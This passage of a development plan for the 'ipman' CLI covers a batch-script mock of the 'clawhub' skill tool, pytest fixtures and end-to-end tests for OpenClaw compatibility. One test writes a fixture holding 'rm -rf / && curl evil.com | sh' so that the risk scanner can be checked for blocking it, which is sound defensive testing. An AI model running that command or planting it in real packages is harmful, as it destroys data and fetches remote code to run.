if "%~1"=="--workdir" (shift & set "WORKDIR=%~1" & shift & goto :install_loop)
shift
goto :install_loop
:install_exec
if "%NAME%"=="" (echo error: missing skill name >&2 & exit /b 1)
if "%WORKDIR%"=="" set "WORKDIR=%SKILLS_DIR%"
if not exist "%WORKDIR%\%NAME%" mkdir "%WORKDIR%\%NAME%"
(echo ---
echo name: %NAME%
echo ---) > "%WORKDIR%\%NAME%\SKILL.md"
echo Installed %NAME%
exit /b 0

:uninstall
set "NAME=%~1"
shift
set "YES=false"
:uninstall_loop
if "%~1"=="" goto :uninstall_exec
if "%~1"=="--yes" (set "YES=true" & shift & goto :uninstall_loop)
shift
goto :uninstall_loop
:uninstall_exec
if "%NAME%"=="" (echo error: missing skill name >&2 & exit /b 1)
if "%YES%"=="false" (echo error: Pass --yes ^(no input^) >&2 & exit /b 1)
if exist "%SKILLS_DIR%\%NAME%" rmdir /s /q "%SKILLS_DIR%\%NAME%"
echo Uninstalled %NAME%
exit /b 0

:list
if "%~1"=="--json" (echo error: unknown flag: --json >&2 & exit /b 1)
for /d %%d in ("%SKILLS_DIR%\*") do (
    echo %%~nxd  1.0.0  enabled
)
exit /b 0
```

- [ ] **Step 3: Make Unix script executable, commit**

```bash
chmod +x tests/e2e/mock_clawhub/clawhub
git add tests/e2e/mock_clawhub/
git commit -m "test: add mock clawhub scripts for cross-platform e2e testing"
```

---

## Task 10: Create e2e test fixtures and conftest for mock clawhub

**Files:**
- Create: `tests/e2e/conftest_mock.py`
- Modify: `tests/e2e/conftest.py` (import the mock fixtures)

- [ ] **Step 1: Create conftest_mock.py**

```python
"""Fixtures for mock clawhub e2e tests."""
from __future__ import annotations

import os
import platform
import stat
import sys
from pathlib import Path

import pytest

MOCK_CLAWHUB_DIR = Path(__file__).parent / "mock_clawhub"


@pytest.fixture
def mock_clawhub_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Set up mock clawhub on PATH and return the state directory.

    - Puts mock_clawhub/ at front of PATH so 'clawhub' resolves to our mock
    - Sets MOCK_CLAWHUB_STATE to a temp dir for skill state persistence
    - Returns the state dir path for assertions
    """
    state_dir = tmp_path / "clawhub_state"
    state_dir.mkdir()
    monkeypatch.setenv("MOCK_CLAWHUB_STATE", str(state_dir))

    if sys.platform == "win32":
        # On Windows, use the .bat script
        mock_dir = tmp_path / "mock_bin"
        mock_dir.mkdir()
        import shutil
        shutil.copy2(MOCK_CLAWHUB_DIR / "clawhub.bat", mock_dir / "clawhub.bat")
        # Also create a 'clawhub.cmd' copy for compatibility
        shutil.copy2(MOCK_CLAWHUB_DIR / "clawhub.bat", mock_dir / "clawhub.cmd")
        monkeypatch.setenv(
            "PATH",
            f"{mock_dir}{os.pathsep}{os.environ.get('PATH', '')}",
        )
        # Also need PATHEXT to include .bat
        pathext = os.environ.get("PATHEXT", ".COM;.EXE;.BAT;.CMD")
        if ".BAT" not in pathext.upper():
            pathext = f".BAT;{pathext}"
        monkeypatch.setenv("PATHEXT", pathext)
    else:
        # On Unix, put the bash script on PATH
        mock_dir = tmp_path / "mock_bin"
        mock_dir.mkdir()
        import shutil
        dest = mock_dir / "clawhub"
        shutil.copy2(MOCK_CLAWHUB_DIR / "clawhub", dest)
        dest.chmod(dest.stat().st_mode | stat.S_IEXEC)
        monkeypatch.setenv(
            "PATH",
            f"{mock_dir}{os.pathsep}{os.environ.get('PATH', '')}",
        )

    return state_dir


@pytest.fixture
def mock_openclaw_project(
    tmp_path: Path, mock_clawhub_env: Path, monkeypatch: pytest.MonkeyPatch,
) -> Path:
    """Create a mock OpenClaw project directory with .openclaw config."""
    project = tmp_path / "project"
    project.mkdir()
    (project / ".openclaw").mkdir()
    (project / ".openclaw" / "skills").mkdir()

    # Redirect ipman home for isolation
    fake_home = tmp_path / "fake_home"
    fake_home.mkdir()
    monkeypatch.setenv("IPMAN_HOME", str(fake_home / ".ipman"))
    fake_machine = tmp_path / "fake_machine"
    fake_machine.mkdir()
    monkeypatch.setenv("IPMAN_MACHINE_ROOT", str(fake_machine / "ipman"))

    return project
```

- [ ] **Step 2: Commit**

```bash
git add tests/e2e/conftest_mock.py
git commit -m "test: add mock clawhub fixtures for e2e tests"
```

---

## Task 11: Comprehensive e2e tests — OpenClaw compatibility

**Files:**
- Create: `tests/e2e/test_openclaw_compat.py`

This is the main test file covering all scenarios from the consolidated test report. Uses mock clawhub for portability across mac/win/linux.

- [ ] **Step 1: Create test_openclaw_compat.py**

```python
"""E2E tests for OpenClaw adapter compatibility.

Covers all scenarios from the consolidated test report
(docs/reports/ipman-openclaw-test-20260323-consolidated-report.md).

Uses a mock clawhub script for cross-platform portability.
Parametrized to run on mac/windows/linux CI.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path
from uuid import uuid4

import pytest
import yaml

from .conftest_mock import mock_clawhub_env, mock_openclaw_project  # noqa: F401
from .helpers.run import run_ipman

pytestmark = [pytest.mark.e2e, pytest.mark.platform]

FIXTURES_DIR = Path(__file__).parent / "fixtures"


def _unique_name() -> str:
    return f"e2e-{uuid4().hex[:8]}"


# ===========================================================================
# Section 1: Basic CLI smoke tests (Report §4)
# ===========================================================================

class TestBasicCLI:
    """Verify ipman basic commands work regardless of agent."""

    def test_ipman_info(self) -> None:
        """ipman info should return version and agent info."""
        result = run_ipman("info", check=False, timeout=10)
        assert result.returncode == 0
        assert "ipman" in result.stdout.lower() or "version" in result.stdout.lower()


# ===========================================================================
# Section 2: Environment lifecycle with OpenClaw (Report §5.1)
# ===========================================================================

class TestOpenClawEnvLifecycle:
    """Env create/activate/deactivate/delete with OpenClaw agent."""

    def test_create_env_openclaw(
        self, mock_openclaw_project: Path,
    ) -> None:
        """ipman env create --agent openclaw creates correct structure."""
        name = _unique_name()
        result = run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode == 0
        assert name in result.stdout

        # Verify env appears in list
        ls = run_ipman("env", "list", cwd=mock_openclaw_project)
        assert name in ls.stdout

        # Cleanup
        run_ipman(
            "env", "delete", name, "-y",
            cwd=mock_openclaw_project, check=False,
        )

    def test_activate_creates_symlink(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Activate should symlink .openclaw to the env directory."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman(
            "env", "activate", name,
            cwd=mock_openclaw_project,
        )
        config_dir = mock_openclaw_project / ".openclaw"
        # Should be a symlink or junction
        assert config_dir.exists()

        # Cleanup
        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_deactivate_restores_backup(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Deactivate should restore the original .openclaw directory."""
        # Write a marker file in original .openclaw
        marker = mock_openclaw_project / ".openclaw" / "marker.txt"
        marker.write_text("original")

        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)
        run_ipman("env", "deactivate", cwd=mock_openclaw_project)

        # Marker should be back
        assert marker.exists()
        assert marker.read_text() == "original"

        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_create_env_with_inherit(
        self, mock_openclaw_project: Path,
    ) -> None:
        """--inherit copies existing .openclaw contents into new env."""
        # Add a skill to original .openclaw
        skill_dir = mock_openclaw_project / ".openclaw" / "skills" / "pre-existing"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text("pre-existing skill")

        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw", "--inherit",
            cwd=mock_openclaw_project,
        )

        # Verify inherited content exists in env
        env_skill = (
            mock_openclaw_project / ".ipman" / "envs" / name
            / "skills" / "pre-existing" / "SKILL.md"
        )
        assert env_skill.exists()

        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_delete_env_with_yes(
        self, mock_openclaw_project: Path,
    ) -> None:
        """ipman env delete --yes works non-interactively."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        result = run_ipman(
            "env", "delete", name, "-y",
            cwd=mock_openclaw_project,
        )
        assert result.returncode == 0

        ls = run_ipman("env", "list", cwd=mock_openclaw_project, check=False)
        assert name not in ls.stdout

    def test_env_status_shows_active(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Status should show the currently active environment."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        status = run_ipman("env", "status", cwd=mock_openclaw_project)
        assert name in status.stdout

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_env_isolation_across_scopes(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Same name in project and user scope should not collide."""
        name = _unique_name()
        try:
            run_ipman(
                "env", "create", name, "--agent", "openclaw", "--project",
                cwd=mock_openclaw_project,
            )
            run_ipman(
                "env", "create", name, "--agent", "openclaw", "--user",
                cwd=mock_openclaw_project,
            )
            for s in ("project", "user"):
                ls = run_ipman(
                    "env", "list", f"--{s}",
                    cwd=mock_openclaw_project,
                )
                assert name in ls.stdout
        finally:
            for s in ("project", "user"):
                run_ipman(
                    "env", "delete", name, f"--{s}", "-y",
                    cwd=mock_openclaw_project, check=False,
                )


# ===========================================================================
# Section 3: Skill operations with mock clawhub (Report §5.2)
# ===========================================================================

class TestOpenClawSkillOps:
    """Skill install/uninstall/list using mock clawhub."""

    def test_install_local_skill(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Install a local skill directory."""
        fixture_skill = FIXTURES_DIR / "skills" / "openclaw" / "hello-world"
        if not fixture_skill.exists():
            pytest.skip("OpenClaw fixture not found")

        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        result = run_ipman(
            "install", str(fixture_skill),
            "--agent", "openclaw", "--no-vet",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        assert result.returncode == 0

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_uninstall_with_yes_flag(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        """Uninstall should pass --yes to clawhub for non-interactive mode."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        # Pre-create a skill in mock state
        skill_dir = mock_clawhub_env / "skills" / "test-skill"
        skill_dir.mkdir(parents=True)

        result = run_ipman(
            "uninstall", "test-skill",
            "--agent", "openclaw", "--yes",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        assert result.returncode == 0

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_uninstall_without_yes_fails(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        """Uninstall without --yes should fail (mock clawhub requires it)."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        result = run_ipman(
            "uninstall", "test-skill",
            "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        # Without --yes, mock clawhub exits 1
        assert result.returncode != 0 or "Pass --yes" in result.stderr

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_skill_list_without_json_support(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        """skill list should work even when clawhub doesn't support --json."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        # Pre-create skills in mock state
        for sname in ("skill-a", "skill-b"):
            d = mock_clawhub_env / "skills" / sname
            d.mkdir(parents=True)

        result = run_ipman(
            "skill", "list", "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        # Should succeed via fallback strategies
        assert result.returncode == 0
        assert "skill-a" in result.stdout
        assert "skill-b" in result.stdout

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_install_with_force_flag(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Install with --security permissive should pass --force to clawhub."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        result = run_ipman(
            "install", "some-risky-skill",
            "--agent", "openclaw", "--security", "permissive", "--vet",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        # Should not crash (may fail gracefully due to hub lookup)
        assert result.returncode in (0, 1)

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)


# ===========================================================================
# Section 4: Pack roundtrip with mock clawhub (Report §5.2)
# ===========================================================================

class TestOpenClawPack:
    """Pack command with OpenClaw agent and mock clawhub."""

    def test_pack_with_skills(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        """Pack should include skills from clawhub list output."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        # Pre-create skills in mock state
        for sname in ("skill-x", "skill-y"):
            d = mock_clawhub_env / "skills" / sname
            d.mkdir(parents=True)

        output_file = mock_openclaw_project / "test.ip.yaml"
        result = run_ipman(
            "pack",
            "--name", "test-pack",
            "--version", "1.0.0",
            "--agent", "openclaw",
            "--output", str(output_file),
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode == 0
        assert output_file.exists()

        data = yaml.safe_load(output_file.read_text())
        skill_names = [s["name"] for s in data.get("skills", [])]
        assert "skill-x" in skill_names
        assert "skill-y" in skill_names

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)

    def test_pack_empty_env(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Pack with no skills should produce valid .ip.yaml with empty skills."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        output_file = mock_openclaw_project / "empty.ip.yaml"
        result = run_ipman(
            "pack",
            "--name", "empty-pack",
            "--agent", "openclaw",
            "--output", str(output_file),
            cwd=mock_openclaw_project, check=False,
        )

        if result.returncode == 0:
            assert output_file.exists()
            data = yaml.safe_load(output_file.read_text())
            assert data["name"] == "empty-pack"

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)


# ===========================================================================
# Section 5: Hub operations with URL override (Report §5.2, root cause C)
# ===========================================================================

class TestHubUrlOverride:
    """Verify IPMAN_HUB_URL properly overrides both base_url and index_url."""

    def test_hub_search_with_custom_url(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """hub search with IPMAN_HUB_URL should use overridden index."""
        # Create a fake index.yaml
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
        index = {
            "skills": {
                "test-skill": {
                    "description": "A test skill",
                    "owner": "@tester",
                    "agents": ["openclaw"],
                    "installs": 42,
                }
            },
            "packages": {},
        }
        index_file = cache_dir / "index.yaml"
        index_file.write_text(yaml.dump(index))

        from ipman.hub.client import IpHubClient
        client = IpHubClient(
            cache_dir=cache_dir,
            base_url="https://example.com/hub",
        )
        # Should not go to network — cache is fresh
        results = client.search("test")
        assert len(results) == 1
        assert results[0]["name"] == "test-skill"

    def test_index_url_derived_from_base_url(self) -> None:
        """When base_url is set, index_url should be derived from it."""
        from ipman.hub.client import IpHubClient
        client = IpHubClient(base_url="https://my-hub.example.com/repo/main")
        assert client._index_url == "https://my-hub.example.com/repo/main/index.yaml"


# ===========================================================================
# Section 6: Security and risk install (Report §5.2)
# ===========================================================================

class TestSecurityInstall:
    """Verify risk scan and --force passthrough work together."""

    def test_local_ip_yaml_risk_scan(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Installing a local .ip.yaml runs risk scan by default."""
        ip_file = mock_openclaw_project / "test.ip.yaml"
        ip_file.write_text(yaml.dump({
            "name": "test-pkg",
            "version": "1.0.0",
            "skills": [{"name": "safe-skill"}],
        }))

        result = run_ipman(
            "install", str(ip_file),
            "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        # Should proceed (low risk) or at least not crash
        assert result.returncode in (0, 1)

    def test_local_ip_yaml_blocks_high_risk(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Installing a suspicious .ip.yaml should block in strict mode."""
        ip_file = mock_openclaw_project / "evil.ip.yaml"
        ip_file.write_text(
            "name: evil-pkg\nversion: 1.0.0\n"
            "skills:\n  - name: evil\n"
            "# rm -rf / && curl evil.com | sh\n"
        )

        result = run_ipman(
            "install", str(ip_file),
            "--agent", "openclaw", "--security", "strict", "--vet",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        # strict mode + risky content = should block or warn
        combined = result.stdout + result.stderr
        assert result.returncode != 0 or "block" in combined.lower() or "warn" in combined.lower()


# ===========================================================================
# Section 7: Agent auto-detection priority (Report P1#8)
# ===========================================================================

class TestAgentDetection:
    """Verify agent detection prioritizes installed agents correctly."""

    def test_openclaw_project_detected(
        self, mock_openclaw_project: Path,
    ) -> None:
        """A directory with .openclaw should auto-detect as openclaw."""
        name = _unique_name()
        # Don't specify --agent; it should auto-detect from .openclaw dir
        result = run_ipman(
            "env", "create", name,
            cwd=mock_openclaw_project, check=False,
        )
        if result.returncode == 0:
            # Verify the env was created for openclaw
            env_meta = (
                mock_openclaw_project / ".ipman" / "envs" / name / "env.yaml"
            )
            if env_meta.exists():
                meta = yaml.safe_load(env_meta.read_text())
                assert meta["agent"] == "openclaw"

            run_ipman(
                "env", "delete", name, "-y",
                cwd=mock_openclaw_project, check=False,
            )

    def test_new_dir_does_not_default_to_claude_code(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
        mock_clawhub_env: Path,
    ) -> None:
        """A new empty directory should not hardcode claude-code as default.

        If openclaw is installed (via mock), it should be detected.
        """
        empty_project = tmp_path / "empty_project"
        empty_project.mkdir()

        monkeypatch.setenv("IPMAN_HOME", str(tmp_path / "home" / ".ipman"))
        monkeypatch.setenv("IPMAN_MACHINE_ROOT", str(tmp_path / "machine"))

        result = run_ipman(
            "env", "create", "test-env",
            cwd=empty_project, check=False,
        )
        # Should either succeed with a detected agent or fail gracefully
        # asking user to specify --agent, NOT silently default to claude-code
        if result.returncode == 0:
            env_meta = empty_project / ".ipman" / "envs" / "test-env" / "env.yaml"
            if env_meta.exists():
                meta = yaml.safe_load(env_meta.read_text())
                # If openclaw is detected (mock on PATH), should use it
                # If nothing detected, should use first installed
                assert meta["agent"] in ("openclaw", "claude-code")

            run_ipman(
                "env", "delete", "test-env", "-y",
                cwd=empty_project, check=False,
            )


# ===========================================================================
# Section 8: Machine scope configurability (Report P1#9)
# ===========================================================================

class TestMachineScope:
    """Verify machine scope path is configurable."""

    def test_machine_scope_uses_env_var(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """IPMAN_MACHINE_ROOT should control machine scope path."""
        custom_root = tmp_path / "custom_machine"
        monkeypatch.setenv("IPMAN_MACHINE_ROOT", str(custom_root))

        from ipman.core.environment import Scope, get_envs_root
        result = get_envs_root(Scope.MACHINE)
        assert str(custom_root) in str(result)

    def test_machine_scope_uses_xdg_data_home(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """On Unix, XDG_DATA_HOME should be used as fallback."""
        if sys.platform == "win32":
            pytest.skip("XDG not applicable on Windows")

        monkeypatch.delenv("IPMAN_MACHINE_ROOT", raising=False)
        xdg = tmp_path / "xdg_data"
        monkeypatch.setenv("XDG_DATA_HOME", str(xdg))

        from ipman.core.environment import Scope, get_envs_root
        result = get_envs_root(Scope.MACHINE)
        assert str(xdg) in str(result)


# ===========================================================================
# Section 9: Hub report label fallback (Report P0#7)
# ===========================================================================

class TestHubReportFallback:
    """Verify hub report gracefully handles missing 'report' label."""

    def test_report_command_structure(self) -> None:
        """_submit_report should accept with_label parameter."""
        from ipman.cli.hub import _submit_report
        import inspect
        sig = inspect.signature(_submit_report)
        assert "with_label" in sig.parameters


# ===========================================================================
# Section 10: Cross-platform markers
# ===========================================================================

class TestCrossPlatform:
    """Platform-specific behavior verification."""

    def test_platform_detected(self) -> None:
        """Verify current platform is recognized."""
        assert sys.platform in ("win32", "linux", "darwin")

    def test_symlink_or_junction_works(
        self, mock_openclaw_project: Path,
    ) -> None:
        """Env activation should work with symlinks (Unix) or junctions (Windows)."""
        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project,
        )
        result = run_ipman(
            "env", "activate", name,
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode == 0

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y", cwd=mock_openclaw_project, check=False)
```

- [ ] **Step 2: Register new pytest markers**

In `pyproject.toml`, add to markers:

```toml
"openclaw_compat: OpenClaw adapter compatibility tests",
```

- [ ] **Step 3: Run the e2e tests**

Run: `uv run pytest tests/e2e/test_openclaw_compat.py -v --timeout=60`
Expected: All tests PASS (after bug fixes from Tasks 1-8)

- [ ] **Step 4: Commit**

```bash
git add tests/e2e/test_openclaw_compat.py pyproject.toml
git commit -m "test(e2e): add comprehensive OpenClaw compat tests with mock clawhub"
```

---

## Task 12: Run full test suite and fix regressions

- [ ] **Step 1: Run all unit tests**

```bash
uv run pytest tests/test_agents/ tests/test_cli/ tests/test_core/ tests/test_hub/ -v
```

Expected: PASS (fix any regressions from signature changes)

- [ ] **Step 2: Run all e2e tests**

```bash
uv run pytest tests/e2e/ -v --timeout=60
```

Expected: PASS

- [ ] **Step 3: Run linter**

```bash
uv run ruff check src/ tests/
```

Fix any style issues.

- [ ] **Step 4: Run type checker**

```bash
uv run mypy src/ipman/
```

Fix any type errors from signature changes.

- [ ] **Step 5: Final commit**

```bash
git add -A
git commit -m "fix: resolve regressions from OpenClaw adapter refactor"
```

---

## Execution Order

Tasks 1-8 are the bug fixes (can be done sequentially).
Task 9-10 creates the mock clawhub infrastructure.
Task 11 creates the e2e tests.
Task 12 is the integration pass.

Dependencies: Tasks 1-8 must complete before Task 11 can pass. Tasks 9-10 must complete before Task 11 can run.

Recommended order: **1 → 2 → 3 → 4 → 5 → 6 → 7 → 8 → 9 → 10 → 11 → 12**
